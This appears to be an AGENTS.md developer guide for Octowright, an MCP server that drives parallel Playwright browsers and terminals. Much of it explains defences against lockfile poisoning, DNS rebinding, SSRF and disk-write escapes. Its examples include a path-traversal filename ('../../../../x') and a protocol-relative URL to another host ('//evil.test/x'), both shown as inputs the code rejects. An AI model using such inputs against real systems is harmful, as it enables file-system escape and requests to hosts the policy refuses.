# AGENTS.md

This file provides guidance to coding agents when working with code in this repository.

## What This Project Is

**Octowright** is an MCP (Model Context Protocol) server that lets agentic coding clients drive multiple parallel Playwright browsers (Chromium, Firefox, WebKit) simultaneously. It records every browser action to JSONL, supports persistent browser profiles with saved login state, and includes a web dashboard for debugging/monitoring.

## Commands

```bash
# Install
make install              # uv sync --all-groups

# Test & quality
make test                 # pytest (no live browsers)
make lint                 # ruff/format/mypy/ty/bandit/codespell/SPDX/LOC/vulture/xenon/secrets
make format               # ruff format + ruff --fix
make typecheck            # mypy only
make ci                   # lint + test
make audit                # pip-audit against the dependency tree
make vulture              # dead-code scan (baseline-ratchet)
make xenon                # cyclomatic complexity (baseline-ratchet)
make secrets-scan         # detect-secrets vs .secrets.baseline
make mutmut               # opt-in mutation testing (slow)

# Run a single test
uv run pytest tests/path/to/test_file.py::test_name -v

# Frontend
cd packages/octowright-frontend && npm run build   # compile TypeScript → static files
cd packages/octowright-frontend && npm run test    # vitest

# Playwright browsers
uv run playwright install webkit firefox chromium

# CLI
uv run octowright serve          # start MCP + HTTP dashboard
uv run octowright restart        # stop the daemon, reap orphans, start a fresh one
uv run octowright selftest       # list MCP tools without a client
uv run octowright scenario list  # list loaded scenarios
uv run octowright persona list   # list saved personas (also: persona create/show/delete)
uv run octowright cleanup        # prune stale recordings + abandoned profiles
uv run octowright dashboard      # mint a single-use dashboard pairing code + /pair URL
uv run octowright init           # scaffold a starter octowright project tree
uv run octowright skill          # install/inspect the octowright agent skill
uv run octowright takeover       # detect + disable competing Playwright MCP plugins
uv run octowright test           # run the JSONL-driven test suite (CI-friendly)
```

## Architecture

### Core Concepts

1. **Browser** — One Playwright instance (one engine, one window). Has `instance_id`, records to JSONL.
2. **Profile** — Persistent on-disk state (`~/.config/octowright/profiles/<persona>/<kind>/`). Survives close/relaunch.
3. **Persona** — Named identity (display name, default URL, credentials). Owns profiles across engines. A persona's `default_url` is also handed to the browser context as Playwright's `base_url`, so `browser_navigate("/orders")` resolves per persona and the same macro replays against a local stack, staging or production by launching as a different persona — see **Host-relative navigation**.
4. **Scenario** — Pre-declared group of personas launched together with roles, fixtures, and verify macros for testing. Canonical roles are `player`/`monitor`/`spectator`; additional domain-specific roles are also in use (`main-site`, `recorder`, `replayer`, `form`, `counter`, `arithmetic` — see `examples/scenarios/` and `demo/bundles/`). `scenarios._validate_scenario` logs `scenario.unknown_role` on any role outside the canonical set so typos surface in logs without blocking custom role vocabularies. A participant may also be a terminal (`kind: terminal`) when the optional extra is installed — see **Terminal Sessions (optional) → Scenario participants**.
5. **Dashboard** — Starlette web UI showing live browsers, recordings, session debugger with embedded video + action timeline.
6. **Terminal** *(optional — requires the `octowright[terminal]` extra)* — One `provide-uterm` connector driven in-process: a local PTY shell, an SSH session, or a telnet connection. Has `instance_id`, `kind="terminal"`, and records to the same JSONL format as browsers. Exposed as `terminal_*` MCP tools and surfaced in the dashboard session list alongside browsers. See **Terminal Sessions (optional)** below.

### Layer Map

```
CLI (Click)
  └─ serve.py → leader-election via lockfile
      ├─ MCP server (MCPServer, stdio transport)
      │   └─ server/browser/*.py   ← @mcp.tool decorated functions
      │   └─ server/macros.py
      │   └─ server/scenarios.py
      │   └─ server/personas.py
      │   └─ server/meta.py
      │   └─ server/terminal/      ← @mcp.tool terminal_* (optional; registered only with the [terminal] extra)
      └─ HTTP server (Starlette)
          └─ http/routes/*.py      ← JSON/WebSocket endpoints
          └─ frontend/             ← built TypeScript SPA
```

**Singleton leader-election**: first `octowright serve` becomes leader (MCP stdio + HTTP + HTTP-MCP proxy at `/mcp`). Additional instances become followers that bridge stdin/stdout to leader's HTTP endpoint. Override with `--no-singleton`. **Split-brain guard**: before a follower's post-bridge respawn (`cli/serve._respawn_if_leader_gone`) spawns a replacement daemon, it also probes the *canonical* HTTP port directly (`_canonical_port_serves_octowright`) — not just the lockfile. The lockfile probe can false-negative during a reconnect storm (a healthy leader momentarily slow, or a lockfile a racing respawn already repointed); spawning then makes `http/lifespan` walk the busy canonical port up to a *bumped* one (6286→6287) and bind a SECOND leader beside the healthy one (observed live). The extra probe makes the respawn defer instead of forking the daemon.

**Follower bridge reliability**: `proxy_bridge.run_proxy(..., health_url=...)` delegates to a supervised bridge. The local stdio follower stays alive while the remote HTTP-MCP leader session is disposable. If the leader stream closes, hangs, or times out, in-flight calls get explicit JSON-RPC bridge errors and later calls reconnect to the current lockfile leader URL. Bridge health snapshots are written to `OCTOWRIGHT_BRIDGE_STATE` and included in `octowright_status()["bridge"]`. `resolve_leader_url` rejects any leader URL whose host is not loopback — any same-user process can overwrite the lockfile, so without this check a hostile local process could redirect MCP traffic (including persona credentials substituted into tool args) to an attacker URL. Opt out with `OCTOWRIGHT_ALLOW_REMOTE_DASHBOARD=1`, the same flag the HTTP layer gates non-loopback binds on.

**Bridge capability token**: the loopback `/mcp` transport drives browsers (RCE-equivalent) and otherwise has **no auth** — any local process can POST to it. The leader generates a random token, writes it to the 0600 lockfile (`LeaderInfo.token`, via `cli/serve`), and requires it on `/mcp` (`http/bridge_auth.BridgeTokenGuard`, wrapped *inside* the host/origin `SensitiveASGIGuard`); the follower reads it back (`proxy_runtime.resolve_leader_token`, gated by the same loopback check as `resolve_leader_url`) and presents it as the `X-Octowright-Token` header. A process that **can't read the lockfile** — a *different user* on a shared host, or a *sandboxed* process — therefore can't drive the leader. **Limits (be honest):** this does NOT defend against a *same-user* process that reads the 0600 lockfile (it gets the token; the lockfile is the same-user trust boundary), and does NOT close the lockfile-poisoning MITM (an attacker who rewrites the lock writes the token too). On by default; disable with `OCTOWRIGHT_BRIDGE_REQUIRE_TOKEN` set to a falsey token. An inline (`--no-singleton`) leader uses an empty token (gate off) since it has no lockfile. The **same** token also gates the follower-only `GET /api/mcp-events` SSE channel (`http/routes/mcp_events._require_token`) — it carries the same follower→leader trust as `/mcp` (a different-user/sandboxed process could otherwise subscribe to the leader's crash/close/driver notification stream), and the browser dashboard never calls it, so the gate is safe on by default. **Mixed-version note:** a follower built between the `/mcp` gate and this one presents the token to `/mcp` but not to `/api/mcp-events`, so after a leader upgrade it is answered `403` there and silently loses proactive notifications until that client reconnects. Notifications are best-effort by design (treat `octowright_status()` as authoritative), so the gate is not relaxed for it. **Browser dashboard (opt-in pairing):** the browser-facing surface (`/api/sessions`, media, `/api/dashboard/events`, `/tail`+screencast WS, persona/scenario/macro writes) can additionally be gated by **dashboard pairing** (`OCTOWRIGHT_DASHBOARD_REQUIRE_PAIRING`, OFF by default). `octowright dashboard` reads the same-user 0600 lockfile, POSTs `/api/pair/mint` with the capability token, and prints a validated `http://HOST:PORT/pair#<code>` URL. The fragment code is single-use, expires after 60 seconds, and is never sent during navigation; `/pair` redeems it for a random short-lived bearer stored only in origin-scoped `sessionStorage`. Dashboard HTTP, streaming fetch/SSE, and protected media send `Authorization: Bearer`; dashboard WebSockets carry a private credential subprotocol while the server selects only the stable `octowright.dashboard` protocol. Guarded routes also accept `X-Octowright-Token` for follower/programmatic callers. Pair codes and bearer digests are app-local, bounded, and invalidated by leader restart. Same-user processes remain trusted because they can read the lockfile and mint their own code. `--open` keeps the code out of browser argv by opening a redirect page in a private 0700 directory.

**Disk-write containment**: every path the daemon writes that flows from an LLM-supplied or recording-supplied string is anchored under `defaults.RECORDINGS_DIR`. `browser_export_script`'s `out_path`, `browser_screenshot`'s output path, and the HAR path recovered by `LaunchOptions.from_launch_record` are all resolved-and-contained against `RECORDINGS_DIR` (symlinks resolved before the prefix check); a poisoned JSONL launch record can't redirect HAR writes anywhere on disk, and an LLM can't escape the recordings root via `..` or symlinks. `recorder.new_log_path` likewise sanitizes the operator-supplied label before it joins the base dir. Browser downloads are contained too: `session/downloads.py` reduces the **remote-controlled** `suggested_filename` (the visited page's Content-Disposition) to a single safe basename and runs it through `reject_unsafe_path` before `download.save_as` — otherwise Playwright's `save_as`, which `os.makedirs` the target's parent, would materialise a `NNN-..` prefix into a real traversable dir and let `../../../../x` escape the recordings root. Golden snapshots (`goldens.save_golden`) and analysis captures (`captures.save_capture`) are written through `atomic_write_text` (temp sibling + `os.replace`) rather than a plain `write_text`, so a same-user attacker who swaps the destination for a symlink in the resolve→write window gets the symlink replaced, not followed — matching how screenshots and macro storage already write.

**Per-pool recordings root**: `BrowserPool(recordings_dir=...)` overrides where **one pool** writes its per-launch artefacts — the JSONL log (`recorder.new_log_path`), video dir, HAR, and downloads. It defaults to the process-global `defaults.RECORDINGS_DIR`; the pool threads its own root into `launch_helpers.build_recording_kwargs` (the video+HAR combiner) and `session/downloads.py` anchors downloads on `session.log_path.parent` (== the owning pool's root, since `new_log_path` writes the JSONL directly under it). This exists for the **concurrent-pools-in-one-process embedding** — a single Python process running several `BrowserPool`s that must not collide on one recordings tree. The normal daemon deployment is one pool = one root and needs no override. **Deliberate reader gap (write-side only):** a custom root reroutes *writes* only. The built-in HTTP dashboard, closed-session discovery (`http/discovery.py`, `http/routes/sessions.py`, `media.py`) and `octowright cleanup` all read the single process-global root, so artefacts a non-default-root pool writes are **not** visible to them. That is acceptable for an embedder that consumes the launch-returned paths (`video_dir`, `log_path`) directly and does not rely on octowright's dashboard. Also unaffected — still bound to the global root: MCP-tool writes (`browser_screenshot` / `browser_export_script` / trace) and HAR-path recovery on handoff (`options.LaunchOptions.from_launch_record`). Surfaced as the read-only `BrowserPool.recordings_dir` property.

**Recording-file privacy**: the per-session JSONL holds typed input, navigated URLs, and console output — and in `OCTOWRIGHT_REDACT_INPUTS=off` deployments, cleartext credentials. `recorder.Recorder` writes it `0600` with a `0700` parent by default (best-effort `chmod`, covering a fresh create *and* a reopened legacy 0644 file) so a *local* user can't read it out-of-band, bypassing the loopback HTTP boundary the dashboard enforces. Opt out with `OCTOWRIGHT_RECORDINGS_PRIVATE` set to a falsey token for setups that intentionally share recordings with other local users.

**DNS-rebinding Host guard**: `http/exposure.py` treats the incoming request `Host` header as part of the local-access boundary, not just the daemon's bind address. Binding to loopback isn't enough on its own — an attacker can point a malicious DNS name at `127.0.0.1` so the victim's browser connects to the local port while sending `Host: malicious.example` and a matching `Origin`, which would otherwise read as a same-origin loopback request. The shared `request_host_loopback_allowed()` helper classifies the `Host`, and both enforcement points run it to reject a non-loopback value: `sensitive_allowed_for_connection` for Starlette request/WebSocket handlers, and `SensitiveASGIGuard` for mounted ASGI apps (the `/mcp` transport and the static dashboard mount — `scope["app"]` resolves to the inner mounted app, so the guard reads the bind host from a wrap-time closure). A rejected HTTP request returns `403`; a rejected WebSocket handshake is closed with code `1008`. Setting `OCTOWRIGHT_ALLOW_REMOTE_DASHBOARD=1` intentionally bypasses the `Host` check, matching the bind-host and bridge opt-outs. Note for tests: Starlette's `TestClient` defaults to the non-loopback `Host: testserver` (and `websocket_connect` ignores `base_url`), so `tests/conftest.py` defaults the test client to a loopback `Host`; tests that assert the rejection path pass an explicit non-loopback `host` header.

**Transport recovery**: If an Octowright MCP call returns `Transport closed` or times out, first check daemon health with `curl http://127.0.0.1:6286/api/health`. There are two distinct failure modes, and only one is recoverable in-session. (1) **Transient leader-stream drop** — the leader process is still alive and reachable, but its SSE/HTTP stream hiccuped: the follower bridge's supervisor (`proxy_supervisor`) fails the in-flight call fast and reconnects in place, so if health is good, retry one Octowright MCP call and it recovers on the *same* session. (2) **Leader gone** — the daemon was killed, restarted (`octowright restart`), crashed, or idle-exited: `proxy_bridge.run_proxy` returns and the follower process exits, so the MCP client's stdio closes. That session cannot recover — the client must reconnect (a new session, for stdio clients). Consequently **`octowright restart` disconnects *every* connected client**; the follower it tears down respawns a replacement daemon on its way out (`_respawn_if_leader_gone`) so the next/reconnecting client finds a live leader quickly. `octowright restart` adds the lockfile-recorded leader pid to its kill set only after verifying that pid's command line is an `octowright serve` process (`restart._locked_pid_is_octowright`): the 0600 lockfile is same-user-writable and a recorded pid can be recycled by the OS to an unrelated process after the daemon dies, so the check stops a stale/poisoned lock from friendly-firing a SIGKILL at a foreign pid (the port-scoped pgrep path it also uses is command-verified for the same reason). To distinguish a broken client handle from a broken daemon, run `uv run --active python scripts/bridge_reconnect_smoke.py`. Do not run `octowright restart` unless daemon health fails or the user explicitly asks for a restart — for a transient blip, retrying one call is the fix, not a restart.

**Leader-side storm protection**: the idle-session reaper (`OCTOWRIGHT_MCP_SESSION_IDLE_SECONDS`) and the pid-liveness dead-follower reaper (housekeeping job 3) both only reclaim sessions whose follower is *gone or quiet* — neither stops a follower that's *alive and storming*, opening a fresh `/mcp` session per forwarded RPC instead of reusing one (the failure mode that put a live leader at **18GB RSS over 2 days** on 2026-07-20, starving real tool calls until every client looked broken). Every prior storm defense is follower-side, so it only helps once every client upgrades; the leader now defends itself in `http/mcp_flap_guard.py`, on by default and deployable with a single daemon restart, independent of follower version. (1) A **per-source new-session rate limit**: a session-creating request (`POST /mcp` with no `Mcp-Session-Id`) beyond `OCTOWRIGHT_MCP_NEW_SESSION_MAX` per `OCTOWRIGHT_MCP_NEW_SESSION_WINDOW_SECONDS` (default 10/10s) is rejected `429 + Retry-After`, keyed by the `X-Octowright-Follower` header a current follower sends — old followers omit it and share the one `anonymous` bucket (the storm, collectively throttled). (2) A **session-table cap**: housekeeping job 4 (`_enforce_mcp_session_cap_once`) evicts the most-idle sessions (silent-past-tracker-TTL before recently-active, so a quietly-waiting live session goes last) whenever the live table exceeds `OCTOWRIGHT_MCP_MAX_SESSIONS` (default 256) — a memory bound no follower can defeat. Legit clients create ~1 session and reuse it, so they never approach either limit. Metrics: `octowright_mcp_new_session_throttled_total`, `octowright_mcp_session_evicted_total`.

**Per-client reconnect (the user performs this, not the agent).** When a stdio session is gone, the recovery step is client-specific; the runtime ships this same matrix in the MCP server `instructions` string (`server/_state.py`), so keep the two in sync. In-session (keeps the conversation): Claude Code — `/mcp` → octowright → **Reconnect** (choose it twice; the first attempt is a known silent no-op); Cursor — Settings → Tools & MCP → toggle octowright off then on; Cline (VS Code) — MCP Servers panel → octowright → **Restart Server**; Copilot in VS Code — Command Palette → **MCP: List Servers** → octowright → Restart; Windsurf — Cascade plugins (MCP) panel → **Refresh**; Gemini CLI — `/mcp disable octowright` then `/mcp enable octowright`; GitHub Copilot CLI — `/mcp reload octowright`; Continue / Zed — re-save the MCP config file (hot-reloads). No in-session path (restart loses the conversation): **Codex CLI, OpenCode, Amp** — the user must restart the client. Universal fallback for any client: a full client restart recovers the server.

**Leader-mode observability**: `octowright_status()["daemon"]["mode"]` reports how the answering leader is running: `"daemon"` (a detached daemon — the resilient default; restarting it leaves followers connected and they reconnect), `"inline"` (the leader is running *inside* an MCP client's own process — fragile: if that client exits or is restarted, every browser dies and other clients lose their backend), or `"unknown"` (leader not yet wired). For `"inline"`, `daemon["inline_reason"]` is `"no_singleton"` (deliberate, via `--no-singleton`) or `"daemon_spawn_failed"` (the fallback when the detached daemon couldn't be spawned — `cli/serve.py` also emits a loud stderr warning in this case). An agent seeing `mode == "inline"` with reason `daemon_spawn_failed` should treat the session as fragile and avoid `octowright restart` (which would kill that very leader).

### Key Files

| Path | Role |
|------|------|
| `src/octowright/browser_pool/pool.py` | `BrowserPool` — top-level lifecycle entry points |
| `src/octowright/browser_pool/lifecycle.py` | Per-session launch / close / handoff logic |
| `src/octowright/browser_pool/listeners.py` | External-close eviction (context.close, browser.disconnected, page.close) |
| `src/octowright/browser_pool/options.py` | Launch-kwargs assembly + tile placement |
| `src/octowright/browser_pool/roster.py` | `browser_spawn_roster` parallel launch coordination |
| `src/octowright/browser_pool/launch_helpers.py` | Shared per-launch wiring (recorder, listeners, init scripts); `build_recording_kwargs` assembles the video+HAR context kwargs under the pool's recordings root |
| `src/octowright/browser_pool/errors.py` | Pool-specific exception types |
| `src/octowright/browser_pool/visuals.py` | Emoji badges, title injection, macro-status pill helpers |
| `src/octowright/browser_pool/_assets/*.js` | Init scripts injected into every page (title tag, corner badge, macro pill) |
| `src/octowright/session/core.py` | `BrowserSession` dataclass |
| `src/octowright/server/_request_context.py` | Republishes each MCP request's context into a contextvar via a `ServerMiddleware`. MCP 2.0 removed the SDK's own `request_ctx`, and the progress heartbeat + idempotent dispatch read it *ambiently* (no `ctx` parameter on the ~126 tools, so nothing leaks into the client schema). Also normalizes `_meta`, which 2.0 made a plain dict with snake_cased spec keys. |
| `src/octowright/server/_state.py` | Shared singletons: `pool`, `mcp` (an `mcp.server.mcpserver.MCPServer` subclass), `scenario_pool`, and `terminal_pool` (`None` unless the `octowright[terminal]` extra is installed) |
| `src/octowright/server/browser/lifecycle.py` | MCP tools: `browser_launch`, `browser_close`, `browser_navigate` |
| `src/octowright/terminal/` (package) | **Optional (`octowright[terminal]`).** In-process `provide-uterm` connector driver. `engine.py` runs the poll loop, `pool.py` is `TerminalPool` (mirrors `BrowserPool`'s surface), `session.py` is `TerminalSession`, `translate.py` maps connector messages → JSONL actions, `redact.py` masks recorded input, `availability.py` is the import-light extra-present detector. All uterm imports are quarantined here. |
| `src/octowright/server/terminal/lifecycle.py` | **Optional.** MCP tools: `terminal_launch`/`terminal_send_input`/`terminal_snapshot`/`terminal_read`/`terminal_wait_for`/`terminal_close`/`terminal_list`. Registered via `server/_optional_tools.py` only when `terminal_pool` is non-`None`. |
| `src/octowright/cli/serve.py` | Leader-election + server startup |
| `src/octowright/http/app.py` | Starlette app factory |
| `src/octowright/macros/` (package) | Record → save → replay pipeline; `execution.py` runs macros, `storage.py` reads/writes JSON, `runtime.py` dispatches actions, `semantic.py` summarizes recordings into human-readable digests (pure helpers, no MCP-tool registry dep — the `@mcp.tool macro_explain` wrapper lives in `server/macros.py`). **Replay classification invariant:** every event the recorder emits must be replayable, skipped, or stripped — `dispatch_simple` counts an unclassified kind as an *error*, so a strip-list that drifts from the recorder turns passive rows into mass bogus failures (a recorded 608-frame socket stream once reported 608 failures per replay). `RECORDER_NOISE` is therefore *derived* rather than hand-mirrored between `runtime.py` and `recording_import.py`, and a test scans `recorder.record` call sites to fail on any NEW unclassified event. |
| `src/octowright/dashboard_events.py` | Pure in-process pub/sub for dashboard SSE/WS fanout; lives at the package root so `server/` MCP-tool modules don't have to reach up into the `http/` layer |
| `src/octowright/scenarios.py` | `Scenario`/`Participant` models + YAML/Python loaders |
| `src/octowright/personas.py` | Persona metadata + credential resolution |
| `src/octowright/resolve.py` | `suggest_for_url()` — persona ranking by URL |
| `src/octowright/defaults.py` | All env-var-driven defaults (port, paths, timeouts). `get_default_url()` resolves the actual bound port at runtime; `get_default_label()` derives username/repo from CWD + git. |
| `src/octowright/http/routes/new_tab.py` | `GET /new-tab` — default landing page for `browser_launch` with no URL. Serves Otto logo, wordmark, live status strip (version, commit, uptime, browser count). Time-based background tint. `GET /otto.svg`. |
| `.octowright/config.yaml` | Per-project config file (project root or any parent). Supports `label:`, `persona:`, `profile:`. Read by `get_default_label()` / `browser_launch` at daemon startup. `octowright init` scaffolds a starter copy. |
| `tools/octowright_demos/` | **Out-of-wheel** demo-bundle generation (catalog, indexer, runtime, exports). Imported by `scripts/demos/*` and `tests/test_demos_*`; not part of the shipped package. |
| `demo/bundles/` | Source-of-truth demo bundles (`demo.yaml` + recorded artifacts). Tracked in git. Re-recording requires browser sessions. |
| `demo/tutorial-export/` | **Derived; gitignored.** Verbatim mirror of `demo/bundles/.../artifacts/` plus generated JSON manifests, consumed by `site-octowright-com`'s sync workflow. Regenerate with `make export-demos` (no browsers needed — just `shutil.copytree` + JSON writes). |
| `docs/architecture/MCP-SHARED-CONTRACT.md` | HTTP API spec (endpoints, request/response shapes) |
| `docs/architecture/` | PlantUML diagrams (render with `make diagrams`) |

### Host-relative navigation

A macro is the behaviour; the persona is the *where*. The browser context resolves relative paths against a `base_url`, so one macro replays against any deployment by launching it as a different persona.

`base_url` resolution, most specific first: an explicit `LaunchOptions.base_url` (for a library caller with no persona to speak for it — a suite pinned to a dev stack), else the launch profile's persona `default_url`. Both cases are **deliberately silent when there is nothing to say**: a profile name need not be a saved persona, and a persona need not declare a `default_url`. Neither passes `base_url=None` — they pass nothing at all, so absolute URLs and every pre-existing macro keep working untouched.

`browser_navigate` accepts a **single** leading slash (`/orders`): same-origin by construction — no scheme to deny, no new host to reach — so `_reject_unsafe_url` lets it through to Playwright for resolution. **Two** slashes is protocol-relative (`//evil.test/x` is a different host) and still goes through the full absolute-URL checks. That relaxation is only sound if the inherited origin is itself trusted, so a `base_url` is validated through the same guard every navigation uses — otherwise it would be a way to reach a host the SSRF policy refuses by writing `/` in a macro.

### JSONL Recording

Every browser action is appended as a JSON object `{ts, action, ...fields}` to a `.jsonl` file per session. JSONL is:
- **Streamed live** via WebSocket `/api/sessions/{id}/tail`
- **Exported** to standalone Python/TS scripts via `export.py`
- **Replayed** as a macro via `macros/execution.py`
- **Diffed** as golden accessibility-tree snapshots via `server/goldens.py`

### MCP Tool Registration

Tools are `@mcp.tool`-decorated async functions in `server/browser/`, `server/macros.py`, `server/personas.py`, `server/scenarios.py`, `server/goldens.py`, and `server/meta.py`. The `mcp` singleton lives in `server/_state.py` and is imported by each submodule. Adding a new tool: decorate a function with `@mcp.tool` in the appropriate submodule — no manual registration needed.

### Macro Status Pill

Every page launched by the pool gets a faint translucent overlay at the bottom-center. While `run_macro` is dispatching, the pill shows the per-browser ID chip (matches the corner-badge color), a live elapsed counter, and the current action description. After completion the pill stays visible with `done` / `failed`; the next macro's `start` push resets the counter. Holding **Alt** makes the pill clickable — click opens a themed modal with the full per-push run history. The pill is `pointer-events: none` by default so it never intercepts page clicks.

Pass `slowmo_ms=N` to `macro_run` / `macro_run_sequence` (or set `OCTOWRIGHT_MACRO_SLOWMO_MS`) to insert a per-action delay between status push and dispatch — useful for following execution by eye.

### Silent-swallow policy

Bandit's B110 (`try/except/pass`) and B112 (`try/except/continue`) are blanket-suppressed in `make lint`. Production code uses these patterns only in:

- Process shutdown paths (signal-handler restore, task-cancel await)
- Dir scans skipping orphans (profile cleanup, recording cleanup)
- JSONL/YAML parse-skip on per-line malformed input (recorder, macro list, persona list)
- Best-effort I/O during teardown

Silent swallow in **user-action paths** must `log.warning` or `log.debug` instead of truly swallowing. The bandit suppression assumes the swallow is intentional, not an excuse to hide failures from the user.

### Idle Watchdog

The idle watchdog is **disabled by default**: the daemon stays up until an explicit `octowright restart` (or reboot). Auto-exit is opt-in because the daemon holds live browser state and its exit closes the follower's stdio — which breaks every connected MCP client and drops open browsers mid-session, with no transparent wake. Opt into auto-exit (for CI / shared / resource-constrained hosts) by setting `OCTOWRIGHT_IDLE_GRACE=<seconds>` or `--idle-grace <seconds>`; then the daemon exits after the pool sits empty that long. `--keep-alive` force-disables it and propagates to the detached daemon. A non-positive value or `off`/`never`/`none`/`disabled` also disables it.

### Frontend

TypeScript SPA in `packages/octowright-frontend/`. Built files land in `src/octowright/server/frontend/`. The dashboard auto-polls `/api/sessions` and uses WebSockets for live event streaming. Types in `src/types.ts` mirror the Python Pydantic/dataclass models. Terminal sessions render with **`@xterm/xterm`** plus the `addon-fit` (fit the display to its container — read-only, never resizes the PTY), `addon-web-links` (clickable URLs), and `addon-unicode11` (wide-char/emoji widths) addons: `terminal-view.ts` wraps an xterm instance behind an injectable factory (unit-testable without a real renderer; a `ResizeObserver` + window-resize refit the display), and `session-terminal.ts` is the terminal-detail boot path. `session.ts` **lazily** `import()`s `session-terminal.js` only for `kind === "terminal"`, so xterm + addons (~250 KB) land in a separate chunk that never loads on the browser-session debugger.

### Terminal Sessions (optional)

Terminal sessions are an **optional, plugin-style feature** gated on the `octowright[terminal]` extra (which pulls in `provide-uterm`). On a core install the extra is absent: `octowright.terminal.is_available()` is `False`, `server/_state.terminal_pool` is `None`, and the `terminal_*` tools never register — **core never imports uterm**. Every uterm import is quarantined under `src/octowright/terminal/`.

> **EXPERIMENTAL — not yet installable from PyPI.** The `provide-uterm` packages the extra depends on are **not published**, so `pip install octowright[terminal]` currently **fails (404)**. The extra works only from a **source checkout** with the sibling `../provide-uterm` repo present (`[tool.uv.sources]` in `pyproject.toml` resolves it for local dev; uv strips those overrides from the built wheel). Until the packages are published, treat terminal support as source-install-only. Core CI runs the terminal suite only when the sibling checkout is available; otherwise `tests/terminal/` is skipped at collection.

A terminal session drives one `provide-uterm` `SessionConnector` **in-process** (no hub/WebSocket). The engine's poll loop pumps `connector.poll_messages()`, deltas each cumulative screen snapshot, and appends actions to the **same JSONL recording format** browsers use — `terminal_start` / `terminal_input` / `terminal_output` / `terminal_stop` — so recordings, the dashboard session list, and disk-write containment treat terminals uniformly. `TerminalSession` carries `kind="terminal"` with a `connector_type` of `pty`, `ssh`, or `telnet`. `TerminalPool` mirrors `BrowserPool`'s surface (`launch`/`get`/`maybe_get`/`iter_sessions`/`list_sessions`/`close`/`close_all`).

**Tools.** `terminal_launch`, `terminal_send_input`, `terminal_snapshot`, `terminal_read`, `terminal_wait_for`, `terminal_close`, `terminal_list`. They register via `server/_optional_tools.py` (gated on `terminal_pool is not None`) rather than `server/__init__`, so the import-only-`__init__` convention test still passes. They form the `terminals` capability profile. `terminal_close` honors `protected` exactly like browser close — it refuses without `force=True`, raising `ProtectedTerminalCloseError`.

**PTY** (`kind="pty"`): forks a local shell. `command=` (default `/bin/bash`), `cols`/`rows` size the PTY.

**SSH** (`kind="ssh"`, args `host`/`port`/`user`/`key_path`/`password`/`known_hosts`/`insecure_no_host_check`): args map to the uterm SSH connector's config keys (`host`/`port`/`username`/`client_key_path`/`password`/`known_hosts`/`insecure_no_host_check`). The connector **requires `known_hosts`** unless `insecure_no_host_check=true`; a missing value surfaces as a clean `{"ok": false, "error": ...}` (the connector raises `ValueError` synchronously in `build_connector`, caught in `terminal_launch`). Passwords are accepted only as a live arg and never persisted. The SSH connector fixes its own remote PTY size and rejects unknown config keys, so `cols`/`rows`/`command` are PTY-only and never sent to it. <!-- pragma: allowlist secret (arg-name prose, not a credential) -->

**Telnet** (`kind="telnet"`, args `host`/`port`, default port 23): uses `TelnetSessionConnector` from `provide-uterm-server`. Performs full RFC 854 IAC negotiation (NAWS, TTYPE) and decodes incoming bytes as **CP437** — the encoding used by most BBS servers — so box-drawing art and ANSI color codes render correctly in xterm. The connector hardcodes 80×25 terminal geometry (standard BBS size); `cols`/`rows`/`command` are ignored. Output is recorded as the same `terminal_output` JSONL deltas as PTY/SSH, so the dashboard and `wait_for` work identically. `wait_for` and `snapshot` operate on the raw (CP437-decoded, ANSI-preserved) byte stream, not a rendered grid — contiguous ASCII prompt text matches reliably; cursor-addressed char-by-char draws do not. Telnet is not supported as a scenario participant.

**Input redaction** reuses `OCTOWRIGHT_REDACT_INPUTS` (see Env Var Configuration): the connector always receives the real bytes; only the recorded `terminal_input` value is masked.

**Dashboard.** `http/state.py` re-exports `terminal_pool` through the same module-property seam as `pool`/`scenario_pool`. `list_sessions`, `session_detail`, and the `session_close` DELETE endpoint all handle terminals when the pool is present, so a terminal appears in the live list, has a terminal-shaped detail (no browser-only video/console/page fields — `_terminal_session_detail` short-circuits before the browser detail builder), and closes from the dashboard. Closed terminal recordings classify the same way off-disk: `http/discovery.py` reads the opening row, so a recording that opens with `terminal_start` (no browser `launch` row) is reported as `kind: "terminal"` by the session list *and* the closed-session detail. The session-detail page renders a **read-only xterm.js terminal screen** for `kind === "terminal"`: `session.ts` branches to `bootTerminalSession` (`session-terminal.ts`), which mounts an xterm instance (`terminal-view.ts`) fed by the recorded `terminal_output` deltas — live via the `/tail` WebSocket and replayed from `GET …/events` for closed sessions. The view is output-only (it never sends keystrokes and does not echo recorded `terminal_input`; typed input stays visible in the action timeline). Each `terminal_output.data` delta is the raw output stream with ANSI escapes preserved, so it is written verbatim into xterm, which does its own emulation — no base64/pyte dependency. `translate.py` emits append deltas while the connector buffer grows (and front-truncates at its ~32KB cap — the delta is the new tail, so xterm keeps its scrollback); when the connector's `clear()` resets the buffer the delta carries `reset: true` and the full buffer, and the view calls `term.reset()` before writing so the stale screen doesn't linger (a program-emitted `\x1b[2J` is just appended bytes xterm executes, not a reset).

**Child-exit EOF.** The poll loop ends a session with `terminal_stop` reason `eof` when `connector.is_connected()` flips. The PTY connector's master fd is non-blocking, so a `b""` read is a true EOF: Linux raises EIO, macOS returns `b""`, and `PTYConnector._read_master` flips `_connected` on either, so EOF is detected cross-platform.

**Scenario participants.** A scenario can declare a terminal participant (`kind: terminal`, `connector_type: pty`/`ssh`; PTY takes `command`/`cols`/`rows`, SSH takes `host`/`port`/`user`/`key_path`/`known_hosts`/`insecure_no_host_check`). `ScenarioPool.start` partitions participants — browsers through `spawn_roster`, terminals through `terminal_pool.launch` — then reassembles them in declaration order; `stop`/`remap` route by kind. Browser-only steps **skip** terminals: fixtures, Playwright startup/verify/teardown macros, and `wait_for_sync` (a terminal participant declaring `startup_macros` is a validation error; `run_macro`/`wait_for_sync` report it as unsupported). SSH fields resolve from the persona's freeform `app.ssh` block (`host`/`port`/`user`/`key_path`/`known_hosts`/`insecure_no_host_check`) with explicit participant fields winning; **no SSH password is read from a scenario** (scenarios are persisted — key-based / known_hosts auth only). Starting a scenario with a terminal participant when the extra isn't installed raises a clear "extra not installed" error. The pure config builders live in `octowright/terminal/connector_config.py` so core `scenarios.py` builds terminal configs without importing uterm. Example: `examples/scenarios/browser-plus-terminal.yaml`.

### Accessibility-snapshot credential scrubbing

Playwright renders a text-ish control's **value** as its accessible name, and the accessibility tree has no notion of `type=password` — a filled password box comes back as `- textbox: hunter2`, byte-identical in shape to a username box. Verified against real Chromium. Every aria sink therefore emitted cleartext credentials: `browser_snapshot`, `browser_brief` (in the **core** profile), `capture_create`, `golden_save` (which persists them to disk indefinitely), `browser_capture_and_close`, the dashboard session detail, and `_resolve_semantic_metadata` — whose parsed `role` lands in the **JSONL recording** on every click, bypassing `OCTOWRIGHT_REDACT_INPUTS` in its default configuration.

